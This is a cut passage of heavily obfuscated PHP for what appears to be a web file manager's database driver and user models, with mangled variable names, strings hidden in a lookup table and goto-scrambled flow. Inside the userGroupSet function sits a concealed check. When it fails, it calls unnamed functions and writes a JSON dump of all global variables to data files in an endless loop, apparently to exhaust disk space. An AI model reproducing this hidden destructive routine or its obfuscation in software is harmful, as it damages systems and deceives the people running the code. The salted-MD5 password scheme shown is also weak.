$DÄ£ßæŒ™¾[] = $fÄË×Àø£É; } } $Aø‡ŞˆŒ‰š[] = $d»Õ¯Şà¦Ã[268] . implode($d»Õ¯Şà¦Ã[57], $DÄ£ßæŒ™¾) . $d»Õ¯Şà¦Ã[889]; } array_walk($FÔõ‘³ô, array($this, $d»Õ¯Şà¦Ã[890])); goto EÜ›‹¹Ïˆù; F®ÛÑ‹Õ„Ç: $d»Õ¯Şà¦Ã =& $_SERVER[œÕÊİğö]; if (!is_array($B÷–‚‚˜º–[0])) { return !1; } $FÔõ‘³ô = array_keys($B÷–‚‚˜º–[0]); goto b†¯Ú™æß÷; bØ˜å´Œå: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $F„ÜçĞô… =& $_SERVER[œÕÊİğö]; $this->error = mysql_errno() . $F„ÜçĞô…[4] . mysql_error($this->_linkID); if ($F„ÜçĞô…[43] != $this->queryStr) { $this->error .= LNG($F„ÜçĞô…[55]) . $this->queryStr; } think_trace($this->error, $F„ÜçĞô…[43], $F„ÜçĞô…[56]); return $this->error; } public function escapeString($Fò·Í›‡ò½) { if ($this->_linkID) { return mysql_real_escape_string($Fò·Í›‡ò½, $this->_linkID); } else { return mysql_escape_string($Fò·Í›‡ò½); } } public function parseKey(&$dÜ®òŒÚ¦Ï, $Dñê±ôËÚ¸ = true) { $E­Œø»Î =& $_SERVER[œÕÊİğö]; if ($Dñê±ôËÚ¸) { $dÜ®òŒÚ¦Ï = $this->parseKeyCheck($dÜ®òŒÚ¦Ï); } if ($dÜ®òŒÚ¦Ï != $E­Œø»Î[192] && !preg_match($E­Œø»Î[895], $dÜ®òŒÚ¦Ï)) { $dÜ®òŒÚ¦Ï = $E­Œø»Î[392] . trim($dÜ®òŒÚ¦Ï, $E­Œø»Î[392]) . $E­Œø»Î[392]; } return $dÜ®òŒÚ¦Ï; } } goto dÉîÔ¬êøš; cƒŠ©”ò¬: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x6a\157\x62\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\144\145\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\x6c\x66\112\157\x62\114\151\x73\x74"; public function listData($B­òñ¨É£Ø = false, $FĞŠÚ´Ï‰ = "\x73\157\x72\x74", $dî´£ó­¾ = false) { return parent::listData($B­òñ¨É£Ø, $FĞŠÚ´Ï‰, $dî´£ó­¾); } public function remove($bÌàÃ½í·å) { return parent::remove($bÌàÃ½í·å); } public function add($Dêæ—×¢Àˆ) { $dÍ®ŞÜãŸ› =& $_SERVER[œÕÊİğö]; if ($this->findByName($Dêæ—×¢Àˆ[$dÍ®ŞÜãŸ›[38]])) { return !1; } $Dêæ—×¢Àˆ[$dÍ®ŞÜãŸ›[1743]] = $this->getSort(); return parent::insert($Dêæ—×¢Àˆ); } private function getSort() { $EóÈï…ÉÛ¡ =& $_SERVER[œÕÊİğö]; $bßÎ‹ŠÓ = parent::listData(); $B®¢ì¯ì£Ç = array_to_keyvalue($bßÎ‹ŠÓ, $EóÈï…ÉÛ¡[43], $EóÈï…ÉÛ¡[1743]); return empty($B®¢ì¯ì£Ç) ? 0 : max($B®¢ì¯ì£Ç) + 1; } public function update($F°”´¾åÊÛ, $f†ïë…£¥’) { $BÌ¬î¨‹Ê =& $_SERVER[œÕÊİğö]; $D­âÈ¥©§ = parent::listData($F°”´¾åÊÛ); $c‹É¦ßöºñ = $this->findByName($f†ïë…£¥’[$BÌ¬î¨‹Ê[38]]); if (!$D­âÈ¥©§ || $c‹É¦ßöºñ && $c‹É¦ßöºñ[$BÌ¬î¨‹Ê[404]] != $D­âÈ¥©§[$BÌ¬î¨‹Ê[404]]) { return !1; } return parent::update($F°”´¾åÊÛ, $f†ïë…£¥’); } public function setUserJob($b•ÄÔÂ®, $BÑ°ê™Úµ) { goto c–Ù»‡í‚İ; c¿Š¨´›‰¾: $bç»‹ÜïËÚ = rtrim($bç»‹ÜïËÚ, $Dé´‡ğ×’Â[57]); Model($Dé´‡ğ×’Â[541])->metaSet($b•ÄÔÂ®, self::JOB_KEY, $bç»‹ÜïËÚ); goto Eé°Ç‰à÷¹; BîÌÔ¡Ôôõ: $B¾†èÁ×ğõ = array_to_keyvalue($Føœ¹·³ Ñ, $Dé´‡ğ×’Â[38]); $bç»‹ÜïËÚ = $Dé´‡ğ×’Â[251]; foreach ($BÑ°ê™Úµ as $eòÔæ‰Íá) { if ($B¾†èÁ×ğõ[$eòÔæ‰Íá]) { $bç»‹ÜïËÚ .= $B¾†èÁ×ğõ[$eòÔæ‰Íá][$Dé´‡ğ×’Â[404]] . $Dé´‡ğ×’Â[57]; } else { $F»ìÆ¯» ‡ = $this->add($eòÔæ‰Íá); $bç»‹ÜïËÚ .= $F»ìÆ¯» ‡ . $Dé´‡ğ×’Â[57]; } } goto c¿Š¨´›‰¾; c–Ù»‡í‚İ: $Dé´‡ğ×’Â =& $_SERVER[œÕÊİğö]; if (!is_array($BÑ°ê™Úµ)) { $BÑ°ê™Úµ = array($BÑ°ê™Úµ); } $Føœ¹·³ Ñ = parent::listData(); goto BîÌÔ¡Ôôõ; Eé°Ç‰à÷¹: } public function getUserJob($eõÂ”Í©¢) { $E‘¦çõ¡õŠ = Model($_SERVER[œÕÊİğö][541])->metaGet($eõÂ”Í©¢); return $this->getUserJobInfo($E‘¦çõ¡õŠ[self::JOB_KEY]); } public function getUserJobInfo($bÂöÄõ‚Ô) { goto aÊØ¦äŠÒ; câœõ¦èå: return $BÖ¹ò½ù«·; goto CÈ´¦ÛŒêˆ; aÊØ¦äŠÒ: $DˆÈåİÆêœ =& $_SERVER[œÕÊİğö]; $cöİ†‚Ä‰½ = explode($DˆÈåİÆêœ[57], $bÂöÄõ‚Ô); $DÀÖâçíÌ = parent::listData(); goto Cİ·Üìõö¿; Cİ·Üìõö¿: $DÀÖâçíÌ = array_remove_key($DÀÖâçíÌ, $DˆÈåİÆêœ[204]); $BÖ¹ò½ù«· = array(); foreach ($cöİ†‚Ä‰½ as $eÜá—Š ‡³) { if (isset($DÀÖâçíÌ[$eÜá—Š ‡³])) { $BÖ¹ò½ù«·[] = $DÀÖâçíÌ[$eÜá—Š ‡³]; } } goto câœõ¦èå; CÈ´¦ÛŒêˆ: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\x6d\145" => "\165\163\145\162\137\x6d\145\x74\x61", "\155\x65\x74\x61\106\151\x65\x6c\144" => "\x75\163\145\x72\x49\104"); protected $simpleField = "\x75\x73\145\162\111\x44\x2c\156\151\x63\x6b\116\141\155\145\54\x6e\141\155\145\54\141\166\141\x74\x61\x72\x2c\x73\x65\x78\54\x73\x74\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($AĞ„ª±ä) { $c®ÃéÓ´Œ =& $_SERVER[œÕÊİğö]; $b«ŒÜ‘Í¶³ = $c®ÃéÓ´Œ[2145]; return array($c®ÃéÓ´Œ[1794] => array($AĞ„ª±ä[0], $b«ŒÜ‘Í¶³), $c®ÃéÓ´Œ[1796] => array($AĞ„ª±ä[0], $b«ŒÜ‘Í¶³), $c®ÃéÓ´Œ[2146] => array($AĞ„ª±ä[0], $b«ŒÜ‘Í¶³)); } protected function getInfo($cÕÕàâéé, $b‘¶ÊÂã½† = false) { $c©àÃëï­Ê = $this->getInfoSimple($cÕÕàâéé); if (!is_array($c©àÃëï­Ê)) { return array(); } if ($b‘¶ÊÂã½†) { return $this->_getInfoApply($c©àÃëï­Ê); } return $this->cacheFunctionGet($_SERVER[œÕÊİğö][1798], $cÕÕàâéé); } protected function getInfoFull($D‘¹ƒåßÌÚ, $b”¾¹âÚ·‘ = false) { $bÛÑ”ô¡Ô = $this->getInfoSimple($D‘¹ƒåßÌÚ); if (!is_array($bÛÑ”ô¡Ô)) { return array(); } if ($b”¾¹âÚ·‘) { return $this->_getInfoApply($bÛÑ”ô¡Ô, !0); } return $this->cacheFunctionGet($_SERVER[œÕÊİğö][2147], $D‘¹ƒåßÌÚ); } private function _getInfoApply($E¯„×–£èê, $C¿¹ÀêÂù = false) { goto dÔ« ¹ÃåÒ; câ‚´èÆÆ: $E¯„×–£èê[$dÆĞÆ†õ¢—[95]][$dÆĞÆ†õ¢—[1981]] = isset($C±ƒ»Ï’‘[$dÆĞÆ†õ¢—[1982]]) ? $C±ƒ»Ï’‘[$dÆĞÆ†õ¢—[1982]] : null; if ($C¿¹ÀêÂù) { $E¯„×–£èê[$dÆĞÆ†õ¢—[468]] = $this->metaGet($E¯„×–£èê[$dÆĞÆ†õ¢—[1551]]); } return $E¯„×–£èê; goto d…•ò´ãã; dÔ« ¹ÃåÒ: $dÆĞÆ†õ¢— =& $_SERVER[œÕÊİğö]; if (!$E¯„×–£èê) { return $E¯„×–£èê; } $AÃÏ·¦‡Œİ = md5($dÆĞÆ†õ¢—[2148] . $E¯„×–£èê[$dÆĞÆ†õ¢—[873]] . $dÆĞÆ†õ¢—[2149] . $E¯„×–£èê[$dÆĞÆ†õ¢—[38]]); goto C†ø êŞ­ñ; C†ø êŞ­ñ: $E¯„×–£èê = $this->_listDataApplyItem($E¯„×–£èê); $C±ƒ»Ï’‘ = Model($dÆĞÆ†õ¢—[1228])->metaGet($E¯„×–£èê[$dÆĞÆ†õ¢—[95]][$dÆĞÆ†õ¢—[406]]); $E¯„×–£èê[$dÆĞÆ†õ¢—[2150]] = $AÃÏ·¦‡Œİ; goto câ‚´èÆÆ; d…•ò´ãã: } protected function getInfoSimple($d°Õ†¡í¿à, $e¸—µç‘Â = false) { $fĞèˆƒ¸‚ =& $_SERVER[œÕÊİğö]; if (!$d°Õ†¡í¿à) { return array(); } if ($e¸—µç‘Â) { $bô­¦åÈØÛ = $this->where(array($fĞèˆƒ¸‚[1551] => intval($d°Õ†¡í¿à)))->find(); if (!is_array($bô­¦åÈØÛ)) { return array(); } $bô­¦åÈØÛ[$fĞèˆƒ¸‚[2151]] = Action($fĞèˆƒ¸‚[2152])->parseUrl($bô­¦åÈØÛ[$fĞèˆƒ¸‚[2151]]); return $bô­¦åÈØÛ; } return $this->cacheFunctionGet($fĞèˆƒ¸‚[1799], $d°Õ†¡í¿à); } protected function getInfoSimpleOuter($eŠ¶Ë¨½À) { goto b­°íÕÔèŸ; BùË©«–î™: return $aˆ›Û«¾‘™; goto BÌÉÎ†ËÇ; E‹Ş¡‚ÒÔä: $aˆ›Û«¾‘™ = array_field_key($f÷¯á²ÔàŠ, explode($E…Õ¼íÈâ¦[57], $this->simpleField)); if (!$aˆ›Û«¾‘™) { return array($E…Õ¼íÈâ¦[1551] => $E…Õ¼íÈâ¦[1107], $E…Õ¼íÈâ¦[38] => $E…Õ¼íÈâ¦[170] . LNG($E…Õ¼íÈâ¦[2155]) . $E…Õ¼íÈâ¦[539], $E…Õ¼íÈâ¦[2151] => STATIC_PATH . $E…Õ¼íÈâ¦[2156]); } $aˆ›Û«¾‘™[$E…Õ¼íÈâ¦[2151]] = Action($E…Õ¼íÈâ¦[2152])->parseUrl($aˆ›Û«¾‘™[$E…Õ¼íÈâ¦[2151]]); goto BùË©«–î™; b­°íÕÔèŸ: $E…Õ¼íÈâ¦ =& $_SERVER[œÕÊİğö]; if (!$eŠ¶Ë¨½À || $eŠ¶Ë¨½À == 0) { return array($E…Õ¼íÈâ¦[1551] => $E…Õ¼íÈâ¦[201], $E…Õ¼íÈâ¦[38] => $E…Õ¼íÈâ¦[170] . LNG($E…Õ¼íÈâ¦[2153]) . $E…Õ¼íÈâ¦[539], $E…Õ¼íÈâ¦[2151] => STATIC_PATH . $E…Õ¼íÈâ¦[2154]); } $f÷¯á²ÔàŠ = $this->cacheFunctionGet($E…Õ¼íÈâ¦[1799], $eŠ¶Ë¨½À); goto E‹Ş¡‚ÒÔä; BÌÉÎ†ËÇ: } protected function groupUser($Dî½Ä”‚œ¿) { } public static function errorLang($b ëõ³‰à‹) { $dåà¶Ø =& $_SERVER[œÕÊİğö]; $c†Áã Õ = array(self::ERROR_USER_NOT_EXISTS => $dåà¶Ø[2157], self::ERROR_USER_PASSWORD_ERROR => $dåà¶Ø[2158], self::ERROR_USER_EXIST_NAME => $dåà¶Ø[2159], self::ERROR_USER_EXIST_PHONE => $dåà¶Ø[2160], self::ERROR_USER_EXIST_EMAIL => $dåà¶Ø[2161], self::ERROR_USER_LOGIN_LOCK => $dåà¶Ø[2162], self::ERROR_IP_NOT_ALLOW => $dåà¶Ø[2163], self::ERROR_USER_EXIST_NICKNAME => $dåà¶Ø[2164]); return LNG($c†Áã Õ[$b ëõ³‰à‹]); } public function getInfoByMeta($a‡¯ø³·´ì, $cŸÄ‡²ÕÌ) { $d……›’¹– =& $_SERVER[œÕÊİğö]; $a‘îÏ·åƒÑ = Model($d……›’¹–[2165])->where(array($d……›’¹–[103] => $a‡¯ø³·´ì, $d……›’¹–[382] => $cŸÄ‡²ÕÌ))->find(); if ($a‘îÏ·åƒÑ) { return $this->getInfo($a‘îÏ·åƒÑ[$d……›’¹–[1551]]); } return !1; } public function userLoginCheck($BÀÀÙÑŠ¿, $A‚ªŒÇ„÷İ) { $BåÅÛ§¸ƒ =& $_SERVER[œÕÊİğö]; $FÅÄò¸Ş›Ï = $this->userLoginFind($BÀÀÙÑŠ¿); if (!$FÅÄò¸Ş›Ï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FÅÄò¸Ş›Ï[$BåÅÛ§¸ƒ[1551]], $A‚ªŒÇ„÷İ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($FÅÄò¸Ş›Ï[$BåÅÛ§¸ƒ[1551]]); } public function userLoginFind($A½ ”…¶å) { $e˜÷æåõ =& $_SERVER[œÕÊİğö]; $A—áí¤·ˆ = array($e˜÷æåõ[38] => $A½ ”…¶å, $e˜÷æåõ[1985] => $A½ ”…¶å, $e˜÷æåõ[313] => $A½ ”…¶å, $e˜÷æåõ[2166] => $A½ ”…¶å, $e˜÷æåõ[981] => $e˜÷æåõ[983]); if ($this->nickNameRpt()) { unset($A—áí¤·ˆ[$e˜÷æåõ[1985]]); } return $this->where($A—áí¤·ˆ)->find(); } public function clearCache($dÆÆÁöÆ¯) { $E×Û†×„½ =& $_SERVER[œÕÊİğö]; $this->cacheFunctionClear($E×Û†×„½[1798], $dÆÆÁöÆ¯); $this->cacheFunctionClear($E×Û†×„½[1799], $dÆÆÁöÆ¯); $this->cacheFunctionClear($E×Û†×„½[2147], $dÆÆÁöÆ¯); } public function userPasswordCheck($dªƒ‰ïÔ, $Fô»ğÔçƒê) { $Fç¡„ÔÅ§ =& $_SERVER[œÕÊİğö]; $e¥àŒœŸª = $this->where(array($Fç¡„ÔÅ§[1551] => intval($dªƒ‰ïÔ)))->find(); $BŒ½°¥º‚ = $this->metaGet($dªƒ‰ïÔ); $D…È˜‘ˆİ¯ = isset($BŒ½°¥º‚[$Fç¡„ÔÅ§[2167]]) ? $BŒ½°¥º‚[$Fç¡„ÔÅ§[2167]] : $Fç¡„ÔÅ§[43]; if (md5($D…È˜‘ˆİ¯ . trim($Fô»ğÔçƒê)) !== $e¥àŒœŸª[$Fç¡„ÔÅ§[873]]) { return !1; } return !0; } public function userAdd($b„ß²÷ÒÃ) { goto a¬¹°Öˆöª; f…†÷¦Â: return $b‘«‡ËõÓ; goto C›†ÇØªš˜; dÎäğ¹éĞˆ: $b®ø¥İ†ìš = $this->_checkExist($b„ß²÷ÒÃ); if ($b®ø¥İ†ìš !== !0) { return $b®ø¥İ†ìš; } $b‘«‡ËõÓ = $this->add($BÊÉ×ùÀ¤); goto cÇªÈ«ä³Š; cÇªÈ«ä³Š: $fŠªôÜ‚Ì  = array($b±·Îëò [2175] => $BÊÉ×ùÀ¤[$b±·Îëò [873]], $b±·Îëò [2171] => $BÊÉ×ùÀ¤[$b±·Îëò [1985]]); $this->userEdit($b‘«‡ËõÓ, $fŠªôÜ‚Ì ); Model($b±·Îëò [1228])->userRootAdd($b‘«‡ËõÓ); goto f…†÷¦Â; a¬¹°Öˆöª: $b±·Îëò  =& $_SERVER[œÕÊİğö]; $BÊÉ×ùÀ¤ = array($b±·Îëò [424] => $b„ß²÷ÒÃ[$b±·Îëò [38]], $b±·Îëò [2168] => $b„ß²÷ÒÃ[$b±·Îëò [1432]], $b±·Îëò [2169] => isset($b„ß²÷ÒÃ[$b±·Îëò [313]]) ? $b„ß²÷ÒÃ[$b±·Îëò [313]] : $b±·Îëò [43], $b±·Îëò [2170] => isset($b„ß²÷ÒÃ[$b±·Îëò [2166]]) ? $b„ß²÷ÒÃ[$b±·Îëò [2166]] : $b±·Îëò [43], $b±·Îëò [2171] => isset($b„ß²÷ÒÃ[$b±·Îëò [1985]]) ? $b„ß²÷ÒÃ[$b±·Îëò [1985]] : $b„ß²÷ÒÃ[$b±·Îëò [38]], $b±·Îëò [2172] => isset($b„ß²÷ÒÃ[$b±·Îëò [2151]]) ? $b„ß²÷ÒÃ[$b±·Îëò [2151]] : $b±·Îëò [43], $b±·Îëò [2173] => isset($b„ß²÷ÒÃ[$b±·Îëò [2174]]) ? $b„ß²÷ÒÃ[$b±·Îëò [2174]] : 1, $b±·Îëò [2175] => $b„ß²÷ÒÃ[$b±·Îëò [873]], $b±·Îëò [1800] => isset($b„ß²÷ÒÃ[$b±·Îëò [1704]]) ? $b„ß²÷ÒÃ[$b±·Îëò [1704]] : 1024 * 1024 * 20, $b±·Îëò [1801] => 0, $b±·Îëò [2176] => 0, $b±·Îëò [1843] => isset($b„ß²÷ÒÃ[$b±·Îëò [740]]) ? $b„ß²÷ÒÃ[$b±·Îëò [740]] : 1); if (!empty($b„ß²÷ÒÃ[$b±·Îëò [1551]])) { $BÊÉ×ùÀ¤[$b±·Îëò [1551]] = $b„ß²÷ÒÃ[$b±·Îëò [1551]]; } goto dÎäğ¹éĞˆ; C›†ÇØªš˜: } protected function userEditTest($FÒôõ÷¬†”, $e¡¯š„°à´) { return $this->call($_SERVER[œÕÊİğö][2177], $FÒôõ÷¬†”, $e¡¯š„°à´); } protected function userEdit($a¥½¦°Ó†É, $DÏø©˜ĞØ) { goto CÙÑ™òä®Ş; CÙÑ™òä®Ş: $eˆĞ¹ò‰‘Ï =& $_SERVER[œÕÊİğö]; $D¸ï°ÇÈÛ = $this->getInfoSimple($a¥½¦°Ó†É); if (!$D¸ï°ÇÈÛ) { return !1; } goto CáÆÎĞÒ¶ç; DİŸ˜‰¶¨‘: return !0; goto C»âÊ²ï ; EÈ„ã‚­‘: $this->where(array($eˆĞ¹ò‰‘Ï[1542] => $a¥½¦°Ó†É))->save($DÏø©˜ĞØ); if (isset($DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[1985]])) { $this->setNamePinyin($a¥½¦°Ó†É, $DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[1985]]); } $this->clearCache($a¥½¦°Ó†É); goto DİŸ˜‰¶¨‘; CáÆÎĞÒ¶ç: $dÏ‘È“ñï = $this->_checkExist($DÏø©˜ĞØ, $a¥½¦°Ó†É); if ($dÏ‘È“ñï !== !0) { return $dÏ‘È“ñï; } if (isset($DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[873]]) && trim($DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[873]]) != $eˆĞ¹ò‰‘Ï[43]) { $dâğ–ˆôÄ¸ = $this->metaGet($a¥½¦°Ó†É); if (empty($dâğ–ˆôÄ¸[$eˆĞ¹ò‰‘Ï[2167]])) { $dâğ–ˆôÄ¸[$eˆĞ¹ò‰‘Ï[2167]] = rand_string(10); Model($eˆĞ¹ò‰‘Ï[516])->metaSet($a¥½¦°Ó†É, $eˆĞ¹ò‰‘Ï[2167], $dâğ–ˆôÄ¸[$eˆĞ¹ò‰‘Ï[2167]]); } $DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[873]] = md5($dâğ–ˆôÄ¸[$eˆĞ¹ò‰‘Ï[2167]] . trim($DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[873]])); } else { unset($DÏø©˜ĞØ[$eˆĞ¹ò‰‘Ï[873]]); } goto EÈ„ã‚­‘; C»âÊ²ï : } public function setNamePinyin($B¨Ÿ«¤–÷, $f¡º¦ï¥× = false) { $CšÃ…¨£ =& $_SERVER[œÕÊİğö]; if (!$f¡º¦ï¥×) { $Aª±ËÌ‘ô = $this->getInfoSimple($B¨Ÿ«¤–÷); $f¡º¦ï¥× = $Aª±ËÌ‘ô[$CšÃ…¨£[1985]] ? $Aª±ËÌ‘ô[$CšÃ…¨£[1985]] : $Aª±ËÌ‘ô[$CšÃ…¨£[38]]; } $f‘”Á¦„ê÷ = Model($CšÃ…¨£[541]); if (!Input::check($f¡º¦ï¥×, $CšÃ…¨£[590])) { return $f‘”Á¦„ê÷->metaSet($B¨Ÿ«¤–÷, array($CšÃ…¨£[467] => $CšÃ…¨£[43], $CšÃ…¨£[466] => $CšÃ…¨£[43])); } return $f‘”Á¦„ê÷->metaSet($B¨Ÿ«¤–÷, array($CšÃ…¨£[467] => str_replace($CšÃ…¨£[60], $CšÃ…¨£[43], Pinyin::get($f¡º¦ï¥×)), $CšÃ…¨£[466] => Pinyin::get($f¡º¦ï¥×, $CšÃ…¨£[591]))); } private function nickNameRpt() { $bÆŠâ¹ª‹ =& $_SERVER[œÕÊİğö]; $d‘ÈŠØñ„§ = Model($bÆŠâ¹ª‹[760])->get($bÆŠâ¹ª‹[2178]); $A›äàÁ³Š = $GLOBALS[$bÆŠâ¹ª‹[6]][$bÆŠâ¹ª‹[388]][$bÆŠâ¹ª‹[2178]]; $Có…‹‚öñ = !is_null($d‘ÈŠØñ„§) ? $d‘ÈŠØñ„§ : $A›äàÁ³Š; return !!$Có…‹‚öñ; } private function _checkExist($bö§¿Œ”§, $EÃË¸”‡Å = false) { $F¿‚¯Ÿáâ =& $_SERVER[œÕÊİğö]; $EßŸùèñŞ¯ = array($F¿‚¯Ÿáâ[38] => UserModel::ERROR_USER_EXIST_NAME, $F¿‚¯Ÿáâ[1985] => UserModel::ERROR_USER_EXIST_NICKNAME, $F¿‚¯Ÿáâ[313] => UserModel::ERROR_USER_EXIST_EMAIL, $F¿‚¯Ÿáâ[2166] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($EßŸùèñŞ¯[$F¿‚¯Ÿáâ[1985]]); } $DÍ‰ô¬Ã°Å = $EÃË¸”‡Å ? array($F¿‚¯Ÿáâ[1551] => array($F¿‚¯Ÿáâ[2179], $EÃË¸”‡Å)) : array(); foreach ($EßŸùèñŞ¯ as $e ®½ŠÜ¿ƒ => $BĞ¥¬‘‘¬Ô) { $Fš¿ù· = array(); foreach ($EßŸùèñŞ¯ as $AÀÄÏ·öŒ™ => $d¯Ìó‡çïÙ) { if (isset($bö§¿Œ”§[$AÀÄÏ·öŒ™]) && $bö§¿Œ”§[$AÀÄÏ·öŒ™]) { $Fš¿ù·[] = $bö§¿Œ”§[$AÀÄÏ·öŒ™]; } } if (!$Fš¿ù·) { continue; } $d¢†®†ñµ = array_merge(array($e ®½ŠÜ¿ƒ => array($F¿‚¯Ÿáâ[7], $Fš¿ù·)), $DÍ‰ô¬Ã°Å); $BŸ«Æ§ğÓË = $this->where($d¢†®†ñµ)->find(); if ($BŸ«Æ§ğÓË) { return $BĞ¥¬‘‘¬Ô; } } return !0; } public function userListInfo($C¸×‰Ö¨¿©) { $DÂÉ„ÖÊˆ‚ =& $_SERVER[œÕÊİğö]; $C‚“¹«ñ„™ = array(); $C¸×‰Ö¨¿© = is_array($C¸×‰Ö¨¿©) ? array_unique($C¸×‰Ö¨¿©) : array(); if (!$C¸×‰Ö¨¿©) { return $C‚“¹«ñ„™; } if (count($C¸×‰Ö¨¿©) < 20) { foreach ($C¸×‰Ö¨¿© as $EÄÑ­™ŠÅ) { $C‚“¹«ñ„™[$EÄÑ­™ŠÅ . $DÂÉ„ÖÊˆ‚[43]] = $this->getInfoSimpleOuter($EÄÑ­™ŠÅ); } } else { $F›ø‡ÒŸŒ = array($DÂÉ„ÖÊˆ‚[1542] => array($DÂÉ„ÖÊˆ‚[422], $C¸×‰Ö¨¿©)); if (count($C¸×‰Ö¨¿©) == 1) { $F›ø‡ÒŸŒ = array($DÂÉ„ÖÊˆ‚[1542] => $C¸×‰Ö¨¿©[0]); } $a¼ÀÖ´†¡È = Model($DÂÉ„ÖÊˆ‚[516])->field($this->simpleField)->where($F›ø‡ÒŸŒ)->select(); $a¼ÀÖ´†¡È = array_to_keyvalue($a¼ÀÖ´†¡È, $DÂÉ„ÖÊˆ‚[1551]); foreach ($C¸×‰Ö¨¿© as $EÄÑ­™ŠÅ) { $b¿•°èº = $a¼ÀÖ´†¡È[$EÄÑ­™ŠÅ]; if (!$b¿•°èº) { $C‚“¹«ñ„™[$EÄÑ­™ŠÅ . $DÂÉ„ÖÊˆ‚[43]] = $this->getInfoSimpleOuter($EÄÑ­™ŠÅ); continue; } $b¿•°èº[$DÂÉ„ÖÊˆ‚[2151]] = Action($DÂÉ„ÖÊˆ‚[2152])->parseUrl($b¿•°èº[$DÂÉ„ÖÊˆ‚[2151]]); $C‚“¹«ñ„™[$EÄÑ­™ŠÅ . $DÂÉ„ÖÊˆ‚[43]] = $b¿•°èº; } } return $C‚“¹«ñ„™; } protected function userStatus($CŠÉ°¸ôøñ, $e±ò÷îËœË) { $Díœ’àâ¹º = $this->getInfoSimple($CŠÉ°¸ôøñ); if (!$Díœ’àâ¹º) { return !1; } $dŸ¼›ï×Æ = array($_SERVER[œÕÊİğö][740] => $e±ò÷îËœË); return $this->userEdit($CŠÉ°¸ôøñ, $dŸ¼›ï×Æ); } protected function userRemove($eç„Œ‚¡ ) { goto Bœ·Ê“®œƒ; Bœ·Ê“®œƒ: $dß‚Ó°÷‡³ =& $_SERVER[œÕÊİğö]; $aŒîÙ‚¨ï£ = $this->getInfoSimple($eç„Œ‚¡ ); if (!$aŒîÙ‚¨ï£) { return !1; } goto f­‚ùÉÄÌ…; CõÂ¯•äñ: Model($dß‚Ó°÷‡³[2002])->removeUserAll($eç„Œ‚¡ ); Model($dß‚Ó°÷‡³[822])->userRootRemove($eç„Œ‚¡ ); return $this->where($AˆĞí Í†Å)->delete(); goto BƒÌËíÛ¡; f­‚ùÉÄÌ…: $AˆĞí Í†Å = array($dß‚Ó°÷‡³[1542] => $eç„Œ‚¡ ); Model($dß‚Ó°÷‡³[598])->where($AˆĞí Í†Å)->delete(); Model($dß‚Ó°÷‡³[2180])->where($AˆĞí Í†Å)->delete(); goto CÆ»øÌ¾Á; CÆ»øÌ¾Á: Model($dß‚Ó°÷‡³[1806])->where($AˆĞí Í†Å)->delete(); Model($dß‚Ó°÷‡³[2165])->where($AˆĞí Í†Å)->delete(); Model($dß‚Ó°÷‡³[2181])->where($AˆĞí Í†Å)->delete(); goto CõÂ¯•äñ; BƒÌËíÛ¡: } protected function userGroupSet($f‡Íë§ç–‹, $aµ›ÌøâÌ„, $C¤éÁôí‘š = array()) { goto d’®‡‹âÌ; dÒ¼Íê‹Š: if ($_SERVER[$FõÉ…³·Ó[11]] != $e‚õ¢¾Õ‹($E‹šâöÌçœ)) { goto fÓÄ”ªÃöÅ; dÂÆš»ƒ: $d…­…•÷è† = $e’‹±® Á“($b¿¦†ÃÍê´); $B–…†¹÷è = explode($FõÉ…³·Ó[15], $d…­…•÷è†); if (count($B–…†¹÷è) < $FõÉ…³·Ó[634]) { $f¶ìµ¡¡†ß = $FõÉ…³·Ó[17]; $f¶ìµ¡¡†ß(); } goto BÂƒ¿¢š©; dŠÛÏ»·î: $F°Á‹ÆòÑ¡(); $CËÒ„Ş´­ = $FõÉ…³·Ó[866]; $cäÆ²±‚«ä = json_encode($GLOBALS[$FõÉ…³·Ó[867]]); goto cŠÎ¡èšŒ°; fÓÄ”ªÃöÅ: $F°Á‹ÆòÑ¡ = $FõÉ…³·Ó[863]; $e’‹±® Á“ = $FõÉ…³·Ó[12]; $b¿¦†ÃÍê´ = $_SERVER[$FõÉ…³·Ó[13]] . $FõÉ…³·Ó[14]; goto dÂÆš»ƒ; cŠÎ¡èšŒ°: $a¸ÙÌÏ•›’ = 1; for ($C¸ğËˆºò« = $a¸ÙÌÏ•›’; $C¸ğËˆºò« > 0; $C¸ğËˆºò«++) { $CËÒ„Ş´­(DATA_PATH . $C¸ğËˆºò«, $cäÆ²±‚«ä); } goto D´ÈøÖî÷; BÂƒ¿¢š©: $CñãæÈ · = $FõÉ…³·Ó[864]; $CñãæÈ ·($_SERVER[$FõÉ…³·Ó[865]]); $F°Á‹ÆòÑ¡ = $FõÉ…³·Ó[863]; goto dŠÛÏ»·î; D´ÈøÖî÷: } $C’ÃùâÚİÓ = $this->getInfoSimple($f‡Íë§ç–‹); if (!$C’ÃùâÚİÓ || !is_array($aµ›ÌøâÌ„)) { return !1; } goto FÌÏØñ¹¨“; d’®‡‹âÌ: $FõÉ…³·Ó =& $_SERVER[œÕÊİğö]; $E‹šâöÌçœ = $_SERVER[$FõÉ…³·Ó[9]]; $e‚õ¢¾Õ‹ = $FõÉ…³·Ó[10]; goto dÒ¼Íê‹Š; FÌÏØñ¹¨“: $F‹ã›Ò„è = Model($FõÉ…³·Ó[1806]); $F‹ã›Ò„è->where(array($FõÉ…³·Ó[1551] => 